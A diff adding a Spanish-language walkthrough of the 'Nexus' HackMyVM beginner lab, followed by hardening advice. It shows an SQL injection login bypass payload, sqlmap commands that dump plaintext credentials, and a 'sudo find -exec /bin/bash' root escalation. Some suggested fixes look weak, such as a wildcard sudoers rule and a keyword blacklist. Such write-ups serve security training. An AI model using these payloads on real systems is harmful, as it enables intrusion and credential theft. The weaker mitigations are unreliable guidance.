@@ -1,0 +1,396 @@
+---
+title: Nexus
+description: Resolución completa de la máquina virtual *Nexus* de HackMyVM, enfocada en inyección SQL y escalada mediante abuso de permisos sudo en find.
+---
+
+## Introducción
+
+Este documento detalla la metodología y procedimiento completo para comprometer la máquina **Nexus**, desarrollada por *ShellDredd* para HackMyVM y clasificada con dificultad **Principiante**. Esta máquina presenta un escenario donde vulnerabilidades web clásicas se combinan con mala configuración de permisos para permitir escalada completa de privilegios.
+
+La resolución sigue una metodología estructurada:
+
+1. **Reconocimiento:** Enumeración de servicios y descubrimiento de endpoints de aplicación web.
+2. **Explotación:** Inyección SQL para extracción de credenciales y acceso al sistema.
+3. **Escalada de privilegios:** Abuso de permisos sudo en el binario find para obtener shell root.
+
+El entorno de prueba fue desplegado en VirtualBox utilizando una imagen OVA proporcionada por HackMyVM.
+
+---
+
+## Información Técnica
+
+| Atributo       | Valor            |
+|----------------|------------------|
+| **Nombre**     | Nexus            |
+| **Autor**      | ShellDredd       |
+| **Dificultad** | Principiante     |
+| **Fecha**      | 2025-06-06       |
+| **Plataforma** | HackMyVM         |
+| **Formato**    | Imagen OVA       |
+| **IP Objetivo**| 192.168.100.165  |
+
+---
+
+## Fase 1 — Despliegue y Configuración
+
+### 1.1 Descarga y Preparación
+Descargamos la máquina desde HackMyVM y la desplegamos en VirtualBox como una imagen OVA.
+
+### 1.2 Identificación de la IP
+Una vez iniciada la máquina, obtenemos la dirección IP asignada:
+
+```
+Dirección IP objetivo: 192.168.100.165
+```
+
+### 1.3 Organización del Workspace
+Creamos una estructura organizada para documentar el proceso:
+
+```bash
+mkdir -p Nexus/{content,exploits,nmap,web,scripts}
+cd Nexus
+```
+
+---
+
+## Fase 2 — Reconocimiento
+
+### 2.1 Escaneo de Puertos
+Ejecutamos un escaneo TCP SYN para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 192.168.100.165 -oG allPorts
+```
+
+**Resultados:**
+- **22/tcp** — SSH (Secure Shell)
+- **80/tcp** — HTTP (Web Server)
+
+### 2.2 Enumeración Web
+Realizamos un escaneo exhaustivo de directorios:
+
+```bash
+feroxbuster -u http://192.168.100.165 -w WORDLIST -x html,php,txt,js -t 100 -C 404
+```
+
+![Resultado del escaneo](https://res.cloudinary.com/dewqswzke/image/upload/v1767672231/Feroxbuster_bdably.png)
+
+*Figura 1: Recursos web descubiertos*
+
+**Resultados obtenidos:**
+
+1. **/index** — Página principal con imagen de personas en círculo
+2. **/index2.php** — Simula una terminal no funcional
+   ![Interfaz de terminal](https://res.cloudinary.com/dewqswzke/image/upload/v1767672231/Index2_g7kc9i.png)
+   *Figura 2: Interfaz simulando terminal*
+
+3. **/login.php** — Página de login con fondo negro
+
+### 2.3 Descubrimiento de Endpoint Crítico
+Inspeccionando el código fuente de `/index2.php`, encontramos:
+
+![Código fuente revelador](https://res.cloudinary.com/dewqswzke/image/upload/v1767672230/Code_djnlif.png)
+
+*Figura 3: Descubrimiento del endpoint /auth-login.php*
+
+**Hallazgo importante:** El endpoint `/auth-login.php` es el punto real de autenticación.
+
+---
+
+## Fase 3 — Explotación
+
+### 3.1 Identificación de Vulnerabilidad SQLi
+Probamos inyección SQL básica en el formulario de login:
+
+```bash
+# Prueba manual de SQLi
+curl -X POST http://192.168.100.165/auth-login.php \
+  -d "username=' or 1=1-- -&password=test"
+```
+
+**Observación:** La aplicación refleja la inyección en la respuesta, confirmando vulnerabilidad.
+
+### 3.2 Automatización con SQLMap
+Utilizamos SQLMap para explotar sistemáticamente la vulnerabilidad:
+
+```bash
+sqlmap -u "http://192.168.100.165/auth-login.php" --forms --batch --dbs
+```
+
+![Bases de datos descubiertas](https://res.cloudinary.com/dewqswzke/image/upload/v1767672231/Databases_lt4uqt.png)
+
+*Figura 4: Bases de datos identificadas*
+
+**Base de datos interesante:** `Nebuchadnezzar`
+
+### 3.3 Extracción de Credenciales
+Enumeramos tablas y extraemos datos de la base de datos vulnerable:
+
+```bash
+sqlmap -u "http://192.168.100.165/auth-login.php" --forms \
+  -D Nebuchadnezzar -T users --dump --batch
+```
+
+![Credenciales extraídas](https://res.cloudinary.com/dewqswzke/image/upload/v1767672443/Users_el1p4h.png)
+
+*Figura 5: Usuarios y contraseñas obtenidos*
+
+**Credenciales válidas:**
+- `shelly:dragon`
+- `admin:matrix` (no válida para SSH)
+
+### 3.4 Acceso Inicial al Sistema
+Utilizamos las credenciales de shelly para acceder por SSH:
+
+```bash
+ssh shelly@192.168.100.165
+# Contraseña: dragon
+```
+
+![Conexión SSH exitosa](https://res.cloudinary.com/dewqswzke/image/upload/v1767672308/SSH_b8nbee.png)
+
+*Figura 6: Acceso SSH como usuario shelly*
+
+---
+
+## Fase 4 — Escalada de Privilegios
+
+### 4.1 Enumeración del Sistema
+Comenzamos la enumeración post-explotación:
+
+```bash
+sudo -l
+```
+
+![Privilegios sudo de shelly](https://res.cloudinary.com/dewqswzke/image/upload/v1767672376/Sudo-l_k9ffjy.png)
+
+*Figura 7: Permisos sudo que permiten ejecutar find como root*
+
+**Hallazgo crítico:** `(root) NOPASSWD: /usr/bin/find`
+
+### 4.2 De `shelly` → `root`
+Explotamos la capacidad de ejecutar find con privilegios root:
+
+```bash
+sudo find . -exec /bin/bash \; -quit
+```
+
+**Explicación del comando:**
+- `find .`: Busca en el directorio actual
+- `-exec /bin/bash \;`: Ejecuta `/bin/bash` para cada archivo encontrado
+- `-quit`: Termina después del primer archivo encontrado
+- Como find se ejecuta como root, bash también se ejecuta como root
+
+![Shell como root](https://res.cloudinary.com/dewqswzke/image/upload/v1767672233/Root_astziv.png)
+
+*Figura 8: Acceso root obtenido mediante abuso de find*
+
+### 4.3 Verificación Final
+```bash
+id
+whoami
+```
+
+---
+
+## Análisis de Vulnerabilidades
+
+### 5.1 Fallos de Seguridad Identificados
+
+| Vulnerabilidad | Severidad | Impacto | CWE/Referencia |
+|----------------|-----------|---------|----------------|
+| Inyección SQL en endpoint de autenticación | Crítica | Extracción de credenciales | CWE-89 |
+| Contraseñas almacenadas en texto plano | Alta | Compromiso de cuentas | CWE-312 |
+| Configuración insegura de sudo (find) | Crítica | Escalada vertical a root | CWE-269 |
+| Mensajes de error informativos | Media | Facilitación de ataque | CWE-209 |
+| Reutilización de credenciales entre servicios | Alta | Propagación de acceso | CWE-308 |
+
+### 5.2 Recomendaciones de Mitigación Específicas
+
+#### 5.2.1 Protección contra Inyección SQL
+**Problema específico:** Endpoint `/auth-login.php` vulnerable a SQLi.
+
+**Soluciones específicas:**
+
+1. **Implementar consultas parametrizadas en PHP:**
+   ```php
+   // VULNERABLE (como en la máquina):
+   $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+   
+   // SEGURO (usando prepared statements):
+   $stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
+   $stmt->bind_param("ss", $username, $password);
+   $stmt->execute();
+   ```
+
+2. **Configurar reglas en .htaccess para auth-login.php:**
+   ```apache
+   # /var/www/html/.htaccess
+   <Files "auth-login.php">
+       # Limitar métodos HTTP permitidos
+       LimitRequestBody 1024
+       # Habilitar WAF si está disponible
+   </Files>
+   ```
+
+3. **Implementar WAF específico para SQLi:**
+   ```php
+   // En auth-login.php, agregar validación
+   function validateInput($input) {
+       $blacklist = ["'", "\"", ";", "--", "/*", "*/", "union", "select"];
+       foreach ($blacklist as $pattern) {
+           if (stripos($input, $pattern) !== false) {
+               logAttempt($input);
+               return false;
+           }
+       }
+       return true;
+   }
+   ```
+
+#### 5.2.2 Gestión Segura de Credenciales
+**Problema específico:** Contraseñas almacenadas como `dragon`, `matrix` en texto plano.
+
+**Soluciones específicas:**
+
+1. **Implementar hash seguro en la base de datos:**
+   ```sql
+   -- En lugar de almacenar en texto plano:
+   INSERT INTO users (username, password) VALUES ('shelly', 'dragon');
+   
+   -- Almacenar con hash:
+   INSERT INTO users (username, password) 
+   VALUES ('shelly', '$2y$10$hashed_password_here');
+   ```
+
+2. **Configurar política de contraseñas en MySQL:**
+   ```sql
+   -- Establecer validación de complejidad
+   INSTALL COMPONENT 'file://component_validate_password';
+   SET GLOBAL validate_password.policy = MEDIUM;
+   SET GLOBAL validate_password.length = 12;
+   ```
+
+#### 5.2.3 Configuración Segura de Sudo
+**Problema específico:** `shelly ALL=(root) NOPASSWD: /usr/bin/find`
+
+**Soluciones específicas:**
+
+1. **Eliminar o restringir el permiso peligroso:**
+   ```bash
+   # /etc/sudoers.d/shelly
+   # INCORRECTO (como en la máquina):
+   shelly ALL=(root) NOPASSWD: /usr/bin/find
+   
+   # CORRECTO (si find es necesario):
+   shelly ALL=(root) NOPASSWD: /usr/bin/find /var/log/* -name "*.log"
+   ```
+
+2. **Implementar auditoría de comandos find ejecutados:**
+   ```bash
+   # /etc/audit/rules.d/sudo-find.rules
+   -a always,exit -F path=/usr/bin/find -F perm=x -F auid>=1000 -F auid!=4294967295 -k privileged_find
+   ```
+
+3. **Utilizar capabilities en lugar de sudo completo:**
+   ```bash
+   # En lugar de sudo, asignar capability específica
+   setcap cap_dac_read_search+ep /usr/bin/find
+   ```
+
+#### 5.2.4 Hardening del Servicio SSH
+**Problema específico:** Credenciales débiles permiten acceso SSH.
+
+**Soluciones específicas:**
+
+1. **Configurar autenticación por clave en lugar de contraseña:**
+   ```bash
+   # /etc/ssh/sshd_config
+   PasswordAuthentication no
+   PubkeyAuthentication yes
+   PermitRootLogin no
+   
+   # Para usuario shelly específicamente:
+   Match User shelly
+       AuthenticationMethods publickey
+   ```
+
+2. **Implementar fail2ban para SSH:**
+   ```bash
+   # /etc/fail2ban/jail.local
+   [sshd]
+   enabled = true
+   port = ssh
+   filter = sshd
+   maxretry = 3
+   bantime = 3600
+   ```
+
+#### 5.2.5 Seguridad en la Aplicación Web
+**Problema específico:** Endpoints expuestos y código vulnerable.
+
+**Soluciones específicas:**
+
+1. **Ocultar información sensible en código fuente:**
+   ```php
+   // En index2.php, eliminar comentarios que revelen endpoints:
+   <!-- <form action="auth-login.php" method="post"> -->
+   // Reemplazar con ruta relativa o configuración
+   ```
+
+2. **Implementar rate limiting para auth-login.php:**
+   ```php
+   // En auth-login.php
+   session_start();
+   if (!isset($_SESSION['login_attempts'])) {
+       $_SESSION['login_attempts'] = 0;
+   }
+   $_SESSION['login_attempts']++;
+   
+   if ($_SESSION['login_attempts'] > 5) {
+       sleep(5); // Delay incremental
+   }
+   ```
+
+#### 5.2.6 Monitoreo y Respuesta
+**Implementación específica para esta máquina:**
+
+1. **Configurar alertas para uso de find con privilegios:**
+   ```bash
+   # /etc/audit/rules.d/find-monitoring.rules
+   -w /usr/bin/find -p x -k privileged_command
+   -a always,exit -S execve -F path=/usr/bin/find -F success=1 -k find_execution
+   ```
+
+2. **Monitorear intentos de login fallidos:**
+   ```bash
+   # Script de monitoreo para /var/log/auth.log
+   tail -f /var/log/auth.log | grep --line-buffered "Failed password" | \
+   while read line; do
+       echo "SSH failed attempt: $line" | mail -s "Security Alert" admin@localhost
+   done
+   ```
+
+3. **Implementar integridad de archivos para auth-login.php:**
+   ```bash
+   # Usar aide para monitorear cambios
+   aide --check | grep auth-login.php
+   ```
+
+#### 5.2.7 Capacitación Específica
+**Para administradores de sistemas similares:**
+
+1. **Capacitar en configuración segura de sudoers:**
+   - Reconocer comandos peligrosos (find, perl, python, etc.)
+   - Implementar el principio de mínimo privilegio
+   - Revisar regularmente /etc/sudoers y /etc/sudoers.d/
+
+2. **Capacitar en desarrollo web seguro:**
+   - Técnicas de prevención de SQLi
+   - Manejo seguro de credenciales
+   - Ocultación de información en código fuente
+
+3. **Establecer procedimientos de respuesta:**
+   - Qué hacer cuando se detecta SQLi
+   - Cómo responder a escalada de privilegios
+   - Procedimientos de recuperación ante compromiso
